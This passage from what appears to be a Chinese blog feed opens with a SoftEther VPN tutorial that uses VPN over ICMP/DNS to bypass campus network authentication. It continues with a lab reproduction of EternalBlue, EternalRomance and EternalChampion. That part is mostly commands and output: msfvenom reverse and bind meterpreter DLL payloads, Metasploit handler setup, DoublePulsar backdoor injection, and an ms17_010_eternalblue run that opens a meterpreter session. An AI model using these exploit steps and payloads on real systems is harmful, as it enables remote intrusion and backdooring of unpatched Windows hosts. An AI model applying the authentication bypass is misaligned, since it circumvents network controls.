http://cfya.cfyqy.com/vpn_tool/softether-vpnserver-v4.27-9668-beta-2018.05.29-linux-x86-32bit.tar.gz</span><br></pre></td></tr></table></figure></p><p>64位：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget http://cfya.cfyqy.com/vpn_tool/softether-vpnserver-v4.27-9668-beta-2018.05.29-linux-x64-64bit.tar.gz</span><br></pre></td></tr></table></figure></p><p>根据自己的系统选择相应的位数</p><p>tar -zxvf 解压该压缩包<br><img src="/posts/../../images/vpn/3.png" alt=""></p><p>进入解压的vpnserver中<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> vpnserver</span><br><span class="line">make</span><br></pre></td></tr></table></figure></p><p>然后输入3个连续的1<br><img src="/posts/../../images/vpn/4.png" alt=""><br>继续输入 开启服务<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./vpnserver start</span><br></pre></td></tr></table></figure></p><p>然后进行简单的配置<br>输入<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./vpncmd</span><br></pre></td></tr></table></figure></p><p>依次1，回车，回车<br>接下来输入<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ServerPasswordSet</span><br></pre></td></tr></table></figure></p><p>输入管理服务器的密码，两次确定之后，按 ctrl+C 退出管理。<br><img src="/posts/../../images/vpn/5.png" alt=""><br>设置开机自启动。<br>终端里依次输入：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vi /etc/rc.local</span><br></pre></td></tr></table></figure></p><p>在 exit 0 之前写入(start之前目录， 根据自己安装的位置填写)<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/root/vpnserver/vpnserver start</span><br></pre></td></tr></table></figure></p><p>保存后退出  </p><h1 id="softether-服务端的管理"><a href="#softether-服务端的管理" class="headerlink" title="softether 服务端的管理"></a>softether 服务端的管理</h1><h2 id="管理服务端"><a href="#管理服务端" class="headerlink" title="管理服务端"></a>管理服务端</h2><p>在本地windows上<br>安装softether 服务端的管理软件<br><img src="/posts/../../images/vpn/6.png" alt=""><br>运行该软件后，新设置一个连接，填写相应的配置，填写vps的ip地址和之前设置的softetherr的服务端的密码<br><img src="/posts/../../images/vpn/7.png" alt=""><br>成功的连上vps的softether的服务端，开始相应的配置。<br><img src="/posts/../../images/vpn/14.png" alt=""></p><h2 id="新建hub"><a href="#新建hub" class="headerlink" title="新建hub"></a>新建hub</h2><p>默认已经建立了一个hub,可以使用默认的hub,我这里新建hub再建一个hub,随意的填写名字 和密码<br><img src="/posts/../../images/vpn/15.png" alt=""></p><h2 id="新建用户"><a href="#新建用户" class="headerlink" title="新建用户"></a>新建用户</h2><p>点击test,再点击管理用户，在新建的hub中新建一个用户，填写用户名(随意），密码自己设，连接的验证方式有挺多种的，这里就选择密码验证。<br><img src="/posts/../../images/vpn/12.png" alt=""></p><h2 id="启动SecureNAT"><a href="#启动SecureNAT" class="headerlink" title="启动SecureNAT"></a>启动SecureNAT</h2><p>配置 SecureNAT。在虚拟NAT和DHCP服务器中启动secureNAT,查看一下secureNAT的相应配置，保持默认就行，不要修改。<br><img src="/posts/../../images/vpn/8.png" alt=""></p><h2 id="勾选VPN-over-ICMP-DNS的配置"><a href="#勾选VPN-over-ICMP-DNS的配置" class="headerlink" title="勾选VPN over ICMP/DNS的配置"></a>勾选VPN over ICMP/DNS的配置</h2><p>然后到加密与网络中，点击VPN over ICMP/DNS，勾上那两个功能，校园防断网的实现就靠这个了。<br><img src="/posts/../../images/vpn/10.png" alt=""><br>在这里防断网的功能就已经实现了<br>接下来客户端的四种连接方式的没有必要一一尝试，只要懂得用softether client连接服务端，就可以实现防断网了。    </p><h1 id="客户端的连接"><a href="#客户端的连接" class="headerlink" title="客户端的连接"></a>客户端的连接</h1><p>客户端的连接，在服务端中我么就可以看到有三种连接方式：L2TP加密的连接、openVPN软件连接、VPN Azure连接。当然还有一种连接方式，直接用softether客户端连接。<br>当然个人实践中能实现防断网的只有softether客户端的连接方式。其他的客户端连接方式就当做vpn用吧<br><img src="/posts/../../images/vpn/9.png" alt=""></p><h2 id="softether-client"><a href="#softether-client" class="headerlink" title="softether client"></a>softether client</h2><p>要想实现校园无认证上网，用这种连接方式比较稳。当然该客户端只有电脑版的，没有手机的客户端，有点遗憾。不过你也可以电脑开热点给手机用，虽然麻烦点。<br>下载 softether client<br><img src="/posts/../../images/vpn/16.png" alt=""><br>新建一个vpn连接，如下图填写相应的配置<br><img src="/posts/../../images/vpn/17.png" alt=""><br>然后就可以直接连接了。</p><h2 id="L2TP加密协议连接"><a href="#L2TP加密协议连接" class="headerlink" title="L2TP加密协议连接"></a>L2TP加密协议连接</h2><p>首先softether 服务端要开启IPsec/L2TP中相应的选项，如下图<br><img src="/posts/../../images/vpn/18.png" alt=""><br>这种连接方式实现不了防断网，纯属连接一个vpn翻翻墙就ok啦。   </p><h3 id="手机端的连接"><a href="#手机端的连接" class="headerlink" title="手机端的连接"></a>手机端的连接</h3><p>手机现在都默认有一个vpn的连接功能，填写相应的配置就可以实现vpn连接。<br>打开手机的设置，找到vpn<br><img src="/posts/../../images/vpn/19.png" alt=""><br>添加一个新的连接，填写下图相应的配置，选择L2TP类型，输入服务端上的vps地址、IPsec预共享密钥、test的hub的账户<br><img src="/posts/../../images/vpn/20.png" alt=""></p><h3 id="window系统的连接"><a href="#window系统的连接" class="headerlink" title="window系统的连接"></a>window系统的连接</h3><p>找到<code>Win+R</code>调出运行菜单，输入<code>services.msc</code>，回车，弹出服务控制台。<br>找到<code>Routing and remote access</code>服务，双击打开编辑，设置该服务为自动运行，并启动它<br><img src="/posts/../../images/vpn/21.png" alt=""><br>到电脑的任务栏最右下方，找到vpn<br><img src="/posts/../../images/vpn/22.png" alt=""><br>添加新的vpn<br><img src="/posts/../../images/vpn/23.png" alt=""><br>根据下图进行相应的配置<br><img src="/posts/../../images/vpn/24.png" alt=""><br>然后在高级选择中打开，更改适配器选项，找到相应的适配器。右击属性，安全，允许使用这些协议，勾选相应的选项。<br><img src="/posts/../../images/vpn/25.png" alt=""><br>然后就能在<code>wifi</code>中找到vpn的连接，就可以连接成功啦<br><img src="/posts/../../images/vpn/26.png" alt=""> </p><h2 id="VPN-Azure连接"><a href="#VPN-Azure连接" class="headerlink" title="VPN Azure连接"></a>VPN Azure连接</h2><p><code>softether</code> 服务端,<code>VPN Azure</code>默认是禁用的， 先开启。<br><img src="/posts/../../images/vpn/27.png" alt=""><br>仔细看一下，发现<code>VPN Azure</code>真是骚，不用公网ip,只需要用<code>VPN Azure</code>云服务的主机名，就可以实现连接。</p><p>pc端的连接。找wifi中找到网络和internet设置，找到共享中心，建立新的连接或网络。<br><img src="/posts/../../images/vpn/28.png" alt=""></p><p>选择连接到工作区<br><img src="/posts/../../images/vpn/29.png" alt=""><br>选择否<br><img src="/posts/../../images/vpn/30.png" alt=""><br>使用我的网络连接<br><img src="/posts/../../images/vpn/31.png" alt=""><br>输入<code>VPN Azure</code>云服务的主机名。<br><img src="/posts/../../images/vpn/32.png" alt=""><br>在WiFi出找到该连接，进行连接<br><img src="/posts/../../images/vpn/33.png" alt=""></p><h2 id="openVPN连接"><a href="#openVPN连接" class="headerlink" title="openVPN连接"></a>openVPN连接</h2><p>openVPN这种连接方式不太建议，个人体验，感觉很差，经常连接不上去，网速又慢。<br>softether服务端的配置<br>监听的udp端口要选择53端口。看了网上的教程都说 这样可以实现防断网，不过我个人是没有成功过。然后生成样本配置文件。 确定。<br><img src="/posts/../../images/vpn/34.png" alt=""></p><p>pc端或手机端的配置<br>将生成的样本配置文件中的 文件名为<code>iznbnu828xckp1z_openvpn_remote_access_l3.ovpn</code>复制到openvpn的安装目录的’config’中<br><img src="/posts/../../images/vpn/35.png" alt=""><br>运行该软件，输入hub中用户名和密码开始连接<br><img src="/posts/../../images/vpn/36.png" alt=""><br>这一次又连接失败，当那个黄色的是绿色的时候，才是连接成功。</p><h1 id="pc端防断网测试"><a href="#pc端防断网测试" class="headerlink" title="pc端防断网测试"></a>pc端防断网测试</h1><p>现在我插上网线，没有用锐捷客户端认证，现在处于没有网络的状态。<br><img src="/posts/../../images/vpn/39.png" alt=""><br>可以softether客户端的连接，连接上了，仔细看右下方多了一个网络3的连接，说明我们已经连接上softether 服务端vpn了。现在，没有认证客户端，可以看到vpn适配器在发送数据包，所以说可以上网 。<br><img src="/posts/../../images/vpn/40.png" alt=""><br>我们游览YouTube，真的可以观看。<br><img src="/posts/../../images/vpn/41.png" alt=""></p><h1 id="网速测试"><a href="#网速测试" class="headerlink" title="网速测试"></a>网速测试</h1><p>vultr 日本节点的vps<br><img src="/posts/../../images/vpn/37.png" alt=""></p><p>阿里云服务器：<br><img src="/posts/../../images/vpn/38.png" alt=""></p><p>在这里我们可以看到连接到vultr的vps网速比连接到阿里云的网速快得超多的，所以，个人还是建议搭建在国外的vps,不但能防断网，还是翻墙。   </p><p>参考文章：<br><a href="https://www.bennythink.com/softether-vpnserver.html" target="_blank" rel="noopener">https://www.bennythink.com/softether-vpnserver.html</a><br><a href="https://www.bennythink.com/udp53.html" target="_blank" rel="noopener">https://www.bennythink.com/udp53.html</a></p>]]></content>
      
      <categories>
          
          <category> 杂谈 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 杂谈 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>永恒之蓝、永恒浪漫、永恒冠军复现</title>
      <link href="/posts/caffa366.html"/>
      <url>/posts/caffa366.html</url>
      <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>自从Shadow Brokers（影子经纪人）泄露NSA(美国安全局)    的大量黑客工具，很多人就开始研究该黑客工具利用利用方式。其中比较出名的利用方式就是WannaCry（又叫Wanna Decryptor），一种“蠕虫式”的勒索病毒软件就是利用了其中的永恒之蓝进行传播的。一直听着别人的利用方式，今天就去学习复现一下。<br><a id="more"></a></p><h1 id="Eternalblue（永恒之蓝）"><a href="#Eternalblue（永恒之蓝）" class="headerlink" title="Eternalblue（永恒之蓝）"></a>Eternalblue（永恒之蓝）</h1><h2 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h2><table><thead><tr><th>攻击机(window2003)</th><th>安装FuzzBunch等</th><th>ip 192.168.1.234</th></tr></thead><tbody><tr><td> 靶机(xp)</td><td>被攻击</td><td>ip 192.168.1.238</td></tr><tr><td>另一台攻击机(kail)</td><td>监听端口，靶机返回shell到此攻击机</td><td>ip 192.168.1.230</td></tr></tbody></table><h2 id="window2003相关环境的安装"><a href="#window2003相关环境的安装" class="headerlink" title="window2003相关环境的安装"></a>window2003相关环境的安装</h2><p>Python2.6：<a href="https://www.python.org/download/releases/2.6/（记得加到环境变量里）" target="_blank" rel="noopener">https://www.python.org/download/releases/2.6/（记得加到环境变量里）</a><br>PyWin32 v2.12（根据自己的攻击机系统选择合适的版本）    ：<a href="https://sourceforge.net/projects/pywin32/files/pywin32/Build%20212/" target="_blank" rel="noopener">https://sourceforge.net/projects/pywin32/files/pywin32/Build%20212/</a><br>还有FuzzBunch <a href="https://github.com/misterch0c/shadowbroker" target="_blank" rel="noopener">https://github.com/misterch0c/shadowbroker</a><br>在fb.py中的72行记得注释掉要不会出错。<br><img src="/posts/../../images/yongheng/1.png" alt=""><br> FuzzBunch.xml中修改下图方框中的路径为你的攻击机上的安装目录相应文件的路径<br> <img src="/posts/../../images/yongheng/2.png" alt=""></p><h2 id="尝试攻击"><a href="#尝试攻击" class="headerlink" title="尝试攻击"></a>尝试攻击</h2><p> 运行fb.py<br> <img src="/posts/../../images/yongheng/3.png" alt=""><br> 设置目标地址为靶机(xp)地址，回调地址为本机地址<br>  <img src="/posts/../../images/yongheng/4.png" alt=""><br> 运行<br> <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">use Eternalbule</span><br></pre></td></tr></table></figure></p><p> 当是否提示进行变量设置，选择yes。<br>  <img src="/posts/../../images/yongheng/5.png" alt=""><br>  攻击的系统（可以看到该模块可以攻击系统对象），此此测试环境是xp，所以就选择0 。传输方式选择1 ‘FB’.最后询问是否使用管道，就默认。<br>  <img src="/posts/../../images/yongheng/6.png" alt=""><br> 成功后显示<br> <img src="/posts/../../images/yongheng/7.png" alt=""><br> 失败了可以<br> <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">execute</span><br></pre></td></tr></table></figure></p><p> 多次尝试一下。失败了没关系，下面能成功就行。</p><h2 id="生成dll"><a href="#生成dll" class="headerlink" title="生成dll"></a>生成dll</h2><p> 在kail中<br> 因为是此环境中靶机xp是32位，所以就使用一下命令生成，然后复制到攻击机（window2003）中<br> <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.234 LPORT=5555 -f dll &gt;reverse.dll</span><br></pre></td></tr></table></figure></p><p> 如果是靶机是64位，就<br> <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.234 LPORT=5555 -f dll &gt;reverse.dll</span><br></pre></td></tr></table></figure></p><p> payload（载荷）中<br>bind：攻击者连接目标机器的模式，通常比较适合内网渗透，有时会被防火墙拦下<br>reverse：目标机连接攻击者的模式，基本上不会被防火墙阻拦。<br>附上两条bind<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#32位</span></span><br><span class="line">msfvenom -p windows/meterpreter/bind_tcp RHOST=192.168.1.234 LPORT=5555 -f dll &gt;bind32.dll</span><br><span class="line"><span class="comment">#64位</span></span><br><span class="line">msfvenom -p windows/x64/meterpreter/bind_tcp RHOST=192.168.1.234 LPORT=5555 -f dll &gt;bind64.dll</span><br><span class="line">```  </span><br><span class="line"></span><br><span class="line"><span class="comment">## kail监听</span></span><br><span class="line">```bash</span><br><span class="line">msf &gt; use exploit/multi/handler</span><br><span class="line">msf exploit(multi/handler) &gt; <span class="built_in">set</span>  payload windows/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(multi/handler) &gt; <span class="built_in">set</span> lhost 192.168.1.230</span><br><span class="line">lhost =&gt; 192.168.1.230</span><br><span class="line">msf exploit(multi/handler) &gt; <span class="built_in">set</span> lport 5555</span><br><span class="line">lport =&gt; 5555</span><br><span class="line">msf exploit(multi/handler) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.1.230:5555</span><br></pre></td></tr></table></figure></p><h2 id="使用DoublePulsar"><a href="#使用DoublePulsar" class="headerlink" title="使用DoublePulsar"></a>使用DoublePulsar</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">use DoublePulsar</span><br></pre></td></tr></table></figure><p><img src="/posts/../../images/yongheng/8.png" alt=""><br>Architecture 选择 x32，Function 选 RunDLL，然后输入 DLL 路径<br><img src="/posts/../../images/yongheng/9.png" alt=""><br>成功的话<br>攻击机（window2003）<br> <img src="/posts/../../images/yongheng/11.png" alt=""><br> 攻击机（kail）<br> <img src="/posts/../../images/yongheng/10.png" alt=""> </p><h1 id="Eternalromance（永恒浪漫）"><a href="#Eternalromance（永恒浪漫）" class="headerlink" title="Eternalromance（永恒浪漫）"></a>Eternalromance（永恒浪漫）</h1><h2 id="测试环境-1"><a href="#测试环境-1" class="headerlink" title="测试环境"></a>测试环境</h2><table><thead><tr><th>攻击机(window2003)</th><th>安装shadowbroker等</th><th>ip 192.168.1.234</th></tr></thead><tbody><tr><td> 靶机(window2003)</td><td>被攻击</td><td>ip 192.168.1.135</td></tr><tr><td>另一台攻击机(kail)</td><td>监听端口，靶机返回shell到此攻击机</td><td>ip 192.168.1.230</td></tr></tbody></table><h2 id="Smbtouch判断可用漏洞"><a href="#Smbtouch判断可用漏洞" class="headerlink" title="Smbtouch判断可用漏洞"></a>Smbtouch判断可用漏洞</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">use Smbtouch </span><br><span class="line">execute</span><br></pre></td></tr></table></figure><p> <img src="/posts/../../images/yongheng/12.png" alt=""><br>显示可用的漏洞模块<br> <img src="/posts/../../images/yongheng/13.png" alt=""> </p><h2 id="Doublepulsar生成可用shellcode"><a href="#Doublepulsar生成可用shellcode" class="headerlink" title="Doublepulsar生成可用shellcode"></a>Doublepulsar生成可用shellcode</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">use Doublepulsar</span><br></pre></td></tr></table></figure><p>一路回车知道，注意选择 *0) OutputInstall ，此项功能可生成shellcode<br>文件名为shellcode.bin（可命名为任意文件）<br> <img src="/posts/../../images/yongheng/14.png" alt=""><br>在这里可以看到永恒浪漫可以攻击的系统对象，可以攻击的window系统还是挺多的。<br> <img src="/posts/../../images/yongheng/22.png" alt=""><br>一路回车，生成shellcode.bin<br><img src="/posts/../../images/yongheng/16.png" alt=""><br><img src="/posts/../../images/yongheng/17.png" alt=""></p><h2 id="EternalRomance植入Doublepulsar后门"><a href="#EternalRomance植入Doublepulsar后门" class="headerlink" title="EternalRomance植入Doublepulsar后门"></a>EternalRomance植入Doublepulsar后门</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">use EternalRomance</span><br></pre></td></tr></table></figure><p>一路默认，Pipe[] 和Share[] 为可选项，直接回车跳过，Credentials选Anonymous<br><img src="/posts/../../images/yongheng/18.png" alt=""><br>输入先前生成的文件地址<br><img src="/posts/../../images/yongheng/15.png" alt=""><br>一路默认，执行成功<br><img src="/posts/../../images/yongheng/19.png" alt=""><br>已经成功的植入Doublepulsar后门了，可以利用Doublepulsar  </p><h2 id="生成dll-1"><a href="#生成dll-1" class="headerlink" title="生成dll"></a>生成dll</h2> <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.234 LPORT=5555 -f dll &gt;reverse.dll</span><br></pre></td></tr></table></figure><p> 将生成的reverse.dll复制到攻击机(window2003)中</p><h2 id="kail监听"><a href="#kail监听" class="headerlink" title="kail监听"></a>kail监听</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf &gt; use exploit/multi/handler</span><br><span class="line">msf exploit(multi/handler) &gt; <span class="built_in">set</span>  payload windows/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(multi/handler) &gt; <span class="built_in">set</span> lhost 192.168.1.230</span><br><span class="line">lhost =&gt; 192.168.1.230</span><br><span class="line">msf exploit(multi/handler) &gt; <span class="built_in">set</span> lport 5555</span><br><span class="line">lport =&gt; 5555</span><br><span class="line">msf exploit(multi/handler) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.1.230:5555</span><br></pre></td></tr></table></figure><h2 id="Doublepulsar注入"><a href="#Doublepulsar注入" class="headerlink" title="Doublepulsar注入"></a>Doublepulsar注入</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">use Doublepulsar</span><br></pre></td></tr></table></figure><p>一路默认，注意在Function处选择 2)RunDLL，输入dll文件的位置<br><img src="/posts/../../images/yongheng/21.png" alt=""></p><p>然后回车到结束即可成功利用<br><img src="/posts/../../images/yongheng/20.png" alt=""></p><h1 id="Eternalchampion（永恒冠军）"><a href="#Eternalchampion（永恒冠军）" class="headerlink" title="Eternalchampion（永恒冠军）"></a>Eternalchampion（永恒冠军）</h1><h2 id="测试环境-2"><a href="#测试环境-2" class="headerlink" title="测试环境"></a>测试环境</h2><table><thead><tr><th>攻击机(window2003)</th><th>安装FuzzBunch等</th><th>ip 192.168.1.234</th></tr></thead><tbody><tr><td> 靶机(window2008 r2)</td><td>被攻击</td><td>ip 192.168.1.187</td></tr><tr><td>另一台攻击机(kail)</td><td>监听端口，靶机返回shell到此攻击机</td><td>ip 192.168.1.230    </td></tr></tbody></table><p>工具：winhex </p><h2 id="运行-FuzzBunch"><a href="#运行-FuzzBunch" class="headerlink" title="运行 FuzzBunch"></a>运行 FuzzBunch</h2><p>targetIP写靶机 IP 192.168.1.187，CallBack写本机ip 192.168.1.234，不使用 Redirection<br><img src="/posts/../../images/yongheng/champion/1.png" alt=""> </p><h2 id="smbtouch-探测"><a href="#smbtouch-探测" class="headerlink" title="smbtouch 探测"></a>smbtouch 探测</h2><p>先用smbtouch 探测一下可以利用的模块<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">use smbtouch</span><br><span class="line">execute</span><br></pre></td></tr></table></figure></p><p><img src="/posts/../../images/yongheng/champion/2.png" alt=""><br>显示漏洞利用<br><img src="/posts/../../images/yongheng/champion/3.png" alt=""><br>从图中看出可以使用永恒的冠军</p><h2 id="Doublepulsar-生成-shellcode"><a href="#Doublepulsar-生成-shellcode" class="headerlink" title="Doublepulsar 生成 shellcode"></a>Doublepulsar 生成 shellcode</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">use Doublepulsar</span><br></pre></td></tr></table></figure><p>这次的测试环境的靶机是64位的，所以系统选择x64<br><img src="/posts/../../images/yongheng/champion/4.png" alt=""><br>一路回车直到 出现 0)OutputInstall的选项，选择0输入文件保存地址，这里我写 c:\shellcode64.bin<br><img src="/posts/../../images/yongheng/champion/5.png" alt=""><br>一直回车 ，最后生成shellcode.bin<br><img src="/posts/../../images/yongheng/champion/6.png" alt=""> </p><h2 id="将-shellcode-转换成-HEX"><a href="#将-shellcode-转换成-HEX" class="headerlink" title="将 shellcode 转换成 HEX"></a>将 shellcode 转换成 HEX</h2><p>因为 EternalChampion 需要的是ShellcodeBuffer而不是ShellcodeFile，所以这里要利用winhex将 Doublepulsar 生成的 shellcode 转换成十六进制,后面要用到。<br><img src="/posts/../../images/yongheng/champion/7.png" alt=""> </p><h2 id="EternalChampion-进行攻击"><a href="#EternalChampion-进行攻击" class="headerlink" title="EternalChampion 进行攻击"></a>EternalChampion 进行攻击</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">use EternalChampion</span><br></pre></td></tr></table></figure><p>一直默认回车，直到<code>shellcodeBuffer[]:</code> 将刚才的shellcode64.dll的十六进制的值，粘贴到这里，要一两分钟才能粘贴完，静静等待。<br><img src="/posts/../../images/yongheng/champion/8.png" alt=""><br>在下图我们可以看到永恒的冠军针对的系统还挺多的。<br><img src="/posts/../../images/yongheng/champion/9.png" alt=""><br>然后又是一路回车，到<code>Mode :: Delivery mechanism</code> 选择 FB<br><img src="/posts/../../images/yongheng/champion/10.png" alt=""><br>接下来，还是回车回车回车。<br><img src="/posts/../../images/yongheng/champion/11.png" alt=""><br>复现失败<br>运行<code>execute</code>多次，还是失败，不知道怎么回事，每次到 这里都没有成功过。不管了，看下面能否成功。</p><h2 id="生成dll-2"><a href="#生成dll-2" class="headerlink" title="生成dll"></a>生成dll</h2><p><img src="/posts/../../images/yongheng/champion/12.png" alt=""><br>将生成的dll复制到window2003中</p><h2 id="kail监听-1"><a href="#kail监听-1" class="headerlink" title="kail监听"></a>kail监听</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf &gt; use exploit/multi/handler</span><br><span class="line">msf exploit(multi/handler) &gt; <span class="built_in">set</span>  payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(multi/handler) &gt; <span class="built_in">set</span> lhost 192.168.1.230</span><br><span class="line">lhost =&gt; 192.168.1.230</span><br><span class="line">msf exploit(multi/handler) &gt; <span class="built_in">set</span> lport 6666</span><br><span class="line">lport =&gt; 6666</span><br><span class="line">msf exploit(multi/handler) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.1.230:6666</span><br></pre></td></tr></table></figure><h2 id="使用-Doublepulsar-注入-dll"><a href="#使用-Doublepulsar-注入-dll" class="headerlink" title="使用 Doublepulsar 注入 dll"></a>使用 Doublepulsar 注入 dll</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">use DoublePulsar</span><br></pre></td></tr></table></figure><p>然后到<code>function</code> 选择<code>2)Run DLL</code>，输入 dll 文件路<br><img src="/posts/../../images/yongheng/champion/14.png" alt=""><br>然后运行，回车默认，这里还是失败了。<br>试了很多的机子都没有成功。无奈！</p><h1 id="msf的利用模块"><a href="#msf的利用模块" class="headerlink" title="msf的利用模块"></a>msf的利用模块</h1><h2 id="测试环境-3"><a href="#测试环境-3" class="headerlink" title="测试环境"></a>测试环境</h2><table><thead><tr><th>攻击机(kail)</th><th>ip 192.168.1.234</th></tr></thead><tbody><tr><td> 靶机(window2008 R2)</td><td>ip 192.168.1.238</td></tr></tbody></table><h2 id="ms17-010-eternalblue"><a href="#ms17-010-eternalblue" class="headerlink" title="ms17_010_eternalblue"></a>ms17_010_eternalblue</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf &gt; search ms17_010</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   Name                                      Disclosure Date  Rank     Description</span><br><span class="line">   ----                                      ---------------  ----     -----------</span><br><span class="line">   auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution</span><br><span class="line">   auxiliary/scanner/smb/smb_ms17_010                         normal   MS17-010 SMB RCE Detection</span><br><span class="line">   exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption</span><br><span class="line">   exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution</span><br><span class="line">msf exploit(windows/smb/ms17_010_psexec) &gt; use exploit/windows/smb/ms17_010_eternalblue  </span><br><span class="line">msf exploit(windows/smb/ms17_010_eternalblue) &gt; <span class="built_in">set</span> rhost 192.168.1.187</span><br><span class="line">rhost =&gt; 192.168.1.187</span><br><span class="line">msf exploit(windows/smb/ms17_010_eternalblue) &gt; <span class="built_in">set</span> lhost 192.168.1.230</span><br><span class="line">lhost =&gt; 192.168.1.230</span><br><span class="line">msf exploit(windows/smb/ms17_010_eternalblue) &gt; <span class="built_in">set</span> lport 8888</span><br><span class="line">lport =&gt; 8888</span><br><span class="line">msf exploit(windows/smb/ms17_010_eternalblue) &gt; <span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/x64/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(windows/smb/ms17_010_eternalblue) &gt; exploit</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.1.230:8888 </span><br><span class="line">[*] 192.168.1.187:445 - Connecting to target <span class="keyword">for</span> exploitation.</span><br><span class="line">[+] 192.168.1.187:445 - Connection established <span class="keyword">for</span> exploitation.</span><br><span class="line">[+] 192.168.1.187:445 - Target OS selected valid <span class="keyword">for</span> OS indicated by SMB reply</span><br><span class="line">[*] 192.168.1.187:445 - CORE raw buffer dump (51 bytes)</span><br><span class="line">[*] 192.168.1.187:445 - 0x00000000  57 69 6e 64 6f 77 73 20 53 65 72 76 65 72 20 32  Windows Server 2</span><br><span class="line">[*] 192.168.1.187:445 - 0x00000010  30 30 38 20 52 32 20 53 74 61 6e 64 61 72 64 20  008 R2 Standard </span><br><span class="line">[*] 192.168.1.187:445 - 0x00000020  37 36 30 31 20 53 65 72 76 69 63 65 20 50 61 63  7601 Service Pac</span><br><span class="line">[*] 192.168.1.187:445 - 0x00000030  6b 20 31                                         k 1             </span><br><span class="line">[+] 192.168.1.187:445 - Target arch selected valid <span class="keyword">for</span> arch indicated by DCE/RPC reply</span><br><span class="line">[*] 192.168.1.187:445 - Trying exploit with 12 Groom Allocations.</span><br><span class="line">[*] 192.168.1.187:445 - Sending all but last fragment of exploit packet</span><br><span class="line">[*] 192.168.1.187:445 - Starting non-paged pool grooming</span><br><span class="line">[+] 192.168.1.187:445 - Sending SMBv2 buffers</span><br><span class="line">[+] 192.168.1.187:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.</span><br><span class="line">[*] 192.168.1.187:445 - Sending final SMBv2 buffers.</span><br><span class="line">[*] 192.168.1.187:445 - Sending last fragment of exploit packet!</span><br><span class="line">[*] 192.168.1.187:445 - Receiving response from exploit packet</span><br><span class="line">[+] 192.168.1.187:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!</span><br><span class="line">[*] 192.168.1.187:445 - Sending egg to corrupted connection.</span><br><span class="line">[*] 192.168.1.187:445 - Triggering free of corrupted buffer.</span><br><span class="line">[*] Sending stage (206403 bytes) to 192.168.1.187</span><br><span class="line">[*] Meterpreter session 3 opened (192.168.1.230:8888 -&gt; 192.168.1.187:54937) at 2018-06-01 20:11:08 -0400</span><br><span class="line">[+] 192.168.1.187:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><br><span class="line">[+] 192.168.1.187:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><br><span class="line">[+] 192.168.1.187:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><br><span class="line"></span><br><span class="line">meterpreter &gt; ifconfig</span><br><span class="line"></span><br><span class="line">Interface  1</span><br><span class="line">============</span><br><span class="line">Name         : Software Loopback Interface 1</span><br><span class="line">Hardware MAC : 00:00:00:00:00:00</span><br><span class="line">MTU          : 4294967295</span><br><span class="line">IPv4 Address : 127.0.0.1</span><br><span class="line">IPv4 Netmask : 